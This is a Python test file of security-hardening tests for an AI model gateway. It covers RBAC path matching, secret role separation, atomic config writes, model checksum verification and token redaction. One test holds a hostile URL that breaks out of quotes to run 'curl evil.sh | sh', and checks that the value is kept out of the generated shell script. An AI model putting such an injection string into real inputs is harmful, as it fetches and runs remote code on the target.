"""v2.6 hardening tests (GL-R14/R18/R10/R25).

- R14: secret_manager role split — key_manager no longer touches
  /admin/secrets; the new role owns provider credentials.
- R18: ONE segment-aware matcher everywhere — '/admin' never matches
  '/administrator' (admin gate, RBAC patterns, port shims, the
  extension-router pipeline skip).
- R10: atomic config writes — temp+fsync+os.replace; a crash mid-write
  leaves the previous config intact.
- R25: model download checksums — HF LFS sha256 / Ollama digests ride
  the search results into deploy-custom, which verifies at boot; the
  deployed spec records source_sha256 for provenance.
"""
import json
import types

import gateway.app as gw_app
import gateway.catalog as catalog
import gateway.rbac as rbac
from gateway.auth import path_scope
from gateway.config import GatewayConfig, atomic_write_json

# shared fixtures (same directory)
from test_gateway_stage3 import gguf, wired, _config  # noqa: F401,E401


# ── R18: the one matcher ───────────────────────────────────────────────────

def test_path_scope_segment_safety():
    assert path_scope("/admin", "/admin")
    assert path_scope("/admin", "/admin/keys")
    assert not path_scope("/admin", "/administrator")
    assert not path_scope("/admin", "/adminx")
    assert not path_scope("/admin", "/x/admin")
    assert path_scope("/", "/")
    assert not path_scope("/", "/healthz")


def test_rbac_wildcard_segment_safety():
    """/admin/* matches /admin/keys but never /administrator."""
    assert rbac._path_match("/admin/*", "/admin/keys")
    assert rbac._path_match("/admin/*", "/admin")
    assert not rbac._path_match("/admin/*", "/administrator")
    assert not rbac._path_match("/admin/*", "/adminx/keys")
    assert rbac._path_match("/admin/keys", "/admin/keys")   # exact
    assert not rbac._path_match("/admin/keys", "/admin/keys/x")


def test_admin_gate_ignores_administrator(wired, gguf):
    """A virtual key hitting /administrator (NOT an admin path) passes
    the admin gate — the gate must not loose-prefix-match."""
    from gateway.auth import admin_gate_link
    wired(_config(gguf))
    cfg = gw_app.get_gateway_config()

    class _R:
        url = types.SimpleNamespace(path="/administrator")

        def __init__(self):
            self.headers = {}
    assert admin_gate_link(cfg, _R(), "some-virtual-key") is None


# ── R14: secret_manager split ──────────────────────────────────────────────

def test_key_manager_cannot_touch_secrets():
    assert not rbac.allowed("key_manager", "GET", "/admin/secrets")
    assert not rbac.allowed("key_manager", "POST", "/admin/secrets")
    # its own surface is intact
    assert rbac.allowed("key_manager", "GET", "/admin/keys")
    assert rbac.allowed("key_manager", "POST", "/admin/keys")
    assert rbac.allowed("key_manager", "GET", "/admin/stats")


def test_secret_manager_role():
    assert rbac.allowed("secret_manager", "GET", "/admin/secrets")
    assert rbac.allowed("secret_manager", "POST", "/admin/secrets")
    # and nothing else
    assert not rbac.allowed("secret_manager", "GET", "/admin/keys")
    assert not rbac.allowed("secret_manager", "GET", "/admin/stats")


# ── R10: atomic config writes ──────────────────────────────────────────────

def test_atomic_write_json_leaves_no_tmp(tmp_path):
    p = tmp_path / "gw.json"
    atomic_write_json(p, {"a": 1})
    assert json.loads(p.read_text(encoding="utf-8"))["a"] == 1
    atomic_write_json(p, {"a": 2})
    assert json.loads(p.read_text(encoding="utf-8"))["a"] == 2
    # no temp leftovers
    leftovers = [f for f in tmp_path.iterdir() if f.name.endswith(".tmp")]
    assert leftovers == []


def test_file_store_save_is_atomic(tmp_path, monkeypatch):
    """The store's save replaces the file in ONE step — simulating a
    crash mid-write (os.replace never reached) leaves the ORIGINAL
    file intact."""
    p = tmp_path / "gw.json"
    p.write_text('{"original": true}', encoding="utf-8")
    store = GatewayConfig(p).store

    import os
    real_replace = os.replace

    def _crash(src, dst):
        raise OSError("simulated crash before replace")

    monkeypatch.setattr(os, "replace", _crash)
    try:
        store.save({"new": 1})
        assert False, "save should have raised"
    except OSError:
        pass
    monkeypatch.setattr(os, "replace", real_replace)
    # the original file is intact — no truncation, no corruption
    assert json.loads(p.read_text(encoding="utf-8")) == {"original": True}


# ── R25: model download checksums ──────────────────────────────────────────

def test_custom_script_embeds_sha_verification():
    s = catalog._custom_script(
        "/models", 1, 8192, sha256="ab" * 32)
    assert "sha256sum -c" in s
    assert ("ab" * 32) in s
    # GL-R03 (v2.6): the URL rides $FILE_URL — nothing interpolated
    assert "$FILE_URL" in s
    assert "'http" not in s and "'https" not in s
    # without a digest: no verification step (nothing to check)
    s2 = catalog._custom_script("/models", 1, 8192)
    assert "sha256sum" not in s2


def test_build_custom_spec_carries_provenance():
    spec = catalog.build_custom_spec(
        file_name="m/Q4.gguf", file_url="https://x/m/Q4.gguf",
        size_gb=4.0, gpu_id="g", gpu_count=1, cloud="secure",
        sha256="cd" * 32)
    assert spec["source_sha256"] == "cd" * 32
    assert "sha256sum -c" in spec["docker_script"]
    assert spec["docker_script"].index("sha256sum -c") < \
        spec["docker_script"].index("serving")
    # GL-R03: the URL rides the ENV, never the script text
    assert spec["env"]["FILE_URL"] == "https://x/m/Q4.gguf"
    assert "https://x" not in spec["docker_script"]


def test_custom_script_survives_hostile_url():
    """A URL with shell metacharacters (quote breakout attempt) rides
    the env untouched — the sh text is fixed (GL-R03)."""
    evil = "https://x/m.gguf'; curl evil.sh | sh; echo '"
    spec = catalog.build_custom_spec(
        file_name="m.gguf", file_url=evil, size_gb=1.0,
        gpu_id="g", gpu_count=1, cloud="secure")
    assert spec["env"]["FILE_URL"] == evil
    assert evil not in spec["docker_script"]
    assert "curl evil" not in spec["docker_script"]


def test_spec_sha256_survives_config_roundtrip(tmp_path):
    p = tmp_path / "gw.json"
    p.write_text(json.dumps({
        "backends": {"rp": {"type": "runpod", "api_key_env": "E",
                            "models": {"m": {
                                "image": "x", "source_file": "f.gguf",
                                "source_url": "https://x/f.gguf",
                                "source_sha256": "ef" * 32}}}}}),
        encoding="utf-8")
    cfg = GatewayConfig(p)
    spec = cfg.backends["rp"]["models"]["m"]
    assert spec["source_sha256"] == "ef" * 32


# ── GL-R02 follow-ups (Copilot re-review) ──────────────────────────────────

def test_admin_backends_redacts_session_tokens(wired, gguf):
    """upload_token and env.GW_UPLOAD_TOKEN never leave the gateway
    through /admin/backends — a read-only principal cannot harvest the
    receiver credential."""
    import pathlib
    from fastapi.testclient import TestClient
    wired(_config(gguf))
    from gateway.config import get_gateway_config
    cfg = get_gateway_config()
    cfgfile = pathlib.Path(cfg.path)
    raw = json.loads(cfgfile.read_text(encoding="utf-8"))
    raw["backends"]["rp"] = {
        "type": "runpod", "api_key_env": "E", "models": {}}
    raw["backends"]["rp"]["models"]["upload-receiver"] = {
        "image": "x", "pod_id": "pod-1",
        "upload_token": "sess-secret-tok",
        "env": {"GW_UPLOAD_TOKEN": "sess-secret-tok",
                "OTHER": "visible"}}
    cfgfile.write_text(json.dumps(raw), encoding="utf-8")
    cfg.reload_now()
    with TestClient(gw_app.app) as client:
        r = client.get("/admin/backends",
                       headers={"Authorization": "Bearer admin-secret"})
        body = json.dumps(r.json())
        assert "sess-secret-tok" not in body
        rp = next(b for b in r.json()["backends"]
                  if b["name"] == "rp")
        spec = rp["models"]["upload-receiver"]
        assert spec["upload_token"] == "***redacted***"
        assert spec["env"]["GW_UPLOAD_TOKEN"] == "***redacted***"
        assert spec["env"]["OTHER"] == "visible"   # non-secrets pass


def test_receiver_script_exact_token_and_safe_names():
    """The embedded receiver: constant-time token compare, exact query
    param parse, and the safe-filename contract on PUT/status/file."""
    s = __import__("gateway.upload", fromlist=["_RECEIVER_PY"]).\
        _RECEIVER_PY
    assert "hmac.compare_digest" in s
    assert "parse_qs" in s            # exact param parsing
    assert "SAFE_NAME" in s           # filename allowlist
    # substring matching is gone
    assert '("t=" + TOKEN) in' not in s
    compile(s, "receiver.py", "exec")


def test_relay_hash_popped_at_finalize():
    """Verification state does not outlive its upload."""
    import gateway.upload as up
    up.remember_relay_hash("pod-x", "f.gguf", "ab" * 32)
    assert up.relay_hash("pod-x", "f.gguf") == "ab" * 32
    from gateway.upload import _pop_relay_hash
    assert _pop_relay_hash("pod-x", "f.gguf") == "ab" * 32
    assert up.relay_hash("pod-x", "f.gguf") == ""


async def test_bootstrap_fail_closed_without_sidecar(monkeypatch):
    """An expected sha256 with NO actual digest is a verification
    FAILURE — never report the expected value as verified (Copilot
    re-review: verification-bypass condition)."""
    import types as _types
    import gateway.upload as up
    import gateway.runpod as rp
    import gateway.app as gw_app_mod
    from gateway import catalog as cat

    cfg = _types.SimpleNamespace(
        path=None, store=None,
        backends={"rp": {"type": "runpod", "api_key_env": "E",
                         "models": {}}})

    async def fake_vols(env):
        return []

    async def fake_live(env):
        return {"gpus": [{"id": "g", "price": {"secure": 0.1}}]}

    async def fake_deploy(payload, env):
        return {"id": "pod-bs"}

    async def fake_status(pod_id, filename, token=""):
        # size complete but NO sha256 sidecar
        return {"name": filename, "size": 10, "sha256": ""}

    async def fake_term(cfg, backend, key):
        return {"ok": True}

    monkeypatch.setattr(rp, "list_volumes", fake_vols)
    monkeypatch.setattr(cat, "live_options", fake_live)
    monkeypatch.setattr(rp, "deploy_pod", fake_deploy)
    monkeypatch.setattr(up, "receiver_status", fake_status)
    monkeypatch.setattr(up, "_terminate_helper", fake_term)
    try:
        await up.bootstrap_download(cfg, "rp", "https://x/m.gguf",
                                    "m.gguf", 10, "vol-1",
                                    sha256="ab" * 32)
        assert False, "must raise: expected digest, no sidecar"
    except up.UploadError as e:
        assert "NOT verified" in str(e) or "no digest" in str(e)


# ── GL-R07 follow-up: role-map hashing ─────────────────────────────────────

def test_admin_key_roles_migrated_and_hash_only(wired, gguf):
    """Startup migration hashes admin_key_roles[].key; role_for
    matches hash-only (presenting the stored hash does NOT match)."""
    import gateway.rbac as rbac_mod
    wired(_config(gguf))
    cfgfile = __import__("pathlib").Path(
        gw_app.get_gateway_config().path)
    raw = json.loads(cfgfile.read_text(encoding="utf-8"))
    raw["gateway_keys"] = ["role-admin-plain"]
    raw["admin_key_roles"] = [
        {"key": "role-admin-plain", "role": "ops_readonly"}]
    cfgfile.write_text(json.dumps(raw), encoding="utf-8")
    gw_app._migrate_plaintext_keys()
    migrated = json.loads(cfgfile.read_text(encoding="utf-8"))
    role_key = migrated["admin_key_roles"][0]["key"]
    assert role_key == gw_app._sha256_hex("role-admin-plain")
    assert "role-admin-plain" not in cfgfile.read_text(encoding="utf-8")
    # the ORIGINAL plaintext still resolves its role...
    cfg = gw_app.get_gateway_config()
    cfg.reload_now()
    rbac_mod._MAP.refresh(cfg)
    assert rbac_mod._MAP.role_for(cfg, "role-admin-plain") == \
        "ops_readonly"
    # ...but presenting the stored hash does NOT
    assert rbac_mod._MAP.role_for(cfg, role_key) == ""
